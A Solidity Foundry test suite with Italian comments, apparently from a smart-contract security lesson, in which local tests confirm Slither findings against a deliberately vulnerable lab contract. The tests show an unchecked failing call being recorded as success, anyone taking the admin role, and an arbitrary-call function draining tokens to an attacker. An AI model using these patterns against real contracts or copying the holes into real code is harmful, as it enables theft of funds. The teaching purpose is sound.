// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

// Cheatcode e helper usati nella suite della lezione:
//   makeAddr("nome")   indirizzo deterministico con etichetta leggibile nelle trace;
//   vm.prank(a)        la PROSSIMA call avra' msg.sender = a;
//   vm.expectRevert(e) la PROSSIMA call deve revertire con l'errore e.
//
// Un alert di Slither e' solo un candidato. Diventa finding CONFERMATO quando un test
// locale riproduce il danno: ogni test_Confirmed_* qui e' VERDE perche' l'attacco riesce.
// Per vedere le call: forge test --match-contract NoisyFindingsTest -vvvv
import {Test} from "forge-std/Test.sol";
import {StaticLab} from "../src/noisy/StaticLab.sol";
import {LabToken, RevertingAction} from "../src/mocks/StaticMocks.sol";

contract NoisyFindingsTest is Test {
    StaticLab internal lab;
    address internal admin;
    address internal attacker;

    function setUp() public {
        admin = makeAddr("admin");
        attacker = makeAddr("attacker");
        lab = new StaticLab(admin);
    }

    // ST-01: un'azione che fallisce SEMPRE viene registrata come completata.
    function test_Confirmed_UncheckedCallCreatesFalseSuccess() public {
        RevertingAction target = new RevertingAction();
        // abi.encodeCall costruisce la calldata (selettore + argomenti) controllando i tipi.
        bytes memory data = abi.encodeCall(target.run, (bytes("fails")));

        // Nessun expectRevert: il fallimento interno viene inghiottito e la call "riesce".
        lab.unsafeExecute(address(target), data);

        assertTrue(lab.completed(), "failure was recorded as success");
    }

    // ST-02: un indirizzo qualunque si nomina admin in una sola call.
    function test_Confirmed_AnyoneCanTakeAdminRole() public {
        vm.prank(attacker);
        lab.setAdmin(attacker);

        assertEq(lab.admin(), attacker);
    }

    // ST-03: source (target + data dell'attacker) -> sink (transfer eseguita come StaticLab).
    function test_Confirmed_ArbitraryCallCanMoveAssetsHeldByLab() public {
        // ARRANGE: il laboratorio possiede 100 token ("100 ether" = 100 * 10^18 unita').
        LabToken token = new LabToken();
        token.mint(address(lab), 100 ether);
        // L'attacker prepara la calldata di una transfer verso se stesso.
        bytes memory data = abi.encodeCall(token.transfer, (attacker, 100 ether));

        // ACT: nel token msg.sender sara' StaticLab, quindi si spendono i SUOI token.
        vm.prank(attacker);
        lab.arbitraryExecute(address(token), data);

        // ASSERT: success era true e il require e' passato, eppure gli asset sono spariti.
        assertEq(token.balanceOf(address(lab)), 0);
        assertEq(token.balanceOf(attacker), 100 ether);
    }

    // ST-04: il read path non puo' mai rispondere.
    function test_Confirmed_UninitializedOracleMakesReadPathUnusable() public {
        // Low-level call al posto di expectRevert: interessa solo che fallisca, non il motivo
        // (una call a un indirizzo senza codice reverte senza dati di errore).
        (bool success,) = address(lab).call(abi.encodeCall(StaticLab.readOracle, ()));

        assertFalse(success);
        assertEq(lab.oracle(), address(0));
    }
}
